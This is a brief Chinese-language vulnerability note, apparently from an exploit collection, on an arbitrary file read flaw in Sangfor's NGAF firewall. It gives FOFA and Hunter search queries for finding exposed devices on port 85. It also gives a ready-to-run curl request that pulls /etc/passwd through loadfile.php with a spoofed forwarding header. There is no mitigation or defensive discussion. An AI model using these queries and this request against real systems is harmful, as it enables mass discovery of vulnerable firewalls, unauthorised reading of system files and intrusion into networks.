## 深信服下一代防火墙NGAF任意文件读取漏洞

## fofa:

"Redirect.php?url=/LogInOut.php" && port="85"

## hunter:
web.body="LogInOut.php?type=logout"

## 漏洞复现
```
curl --insecure  https://<host>:85/svpn_html/loadfile.php?file=/etc/./passwd -H "y-forwarded-for: 127.0.0.1"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/W3ujp2P7OjARkXD5FOjonOrfcK6Xr6QOVaCrI21fu9F1DcBPekwcPFBf8Q8vCrI4Qmiaia2YaMExoogwic2TSnNKQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



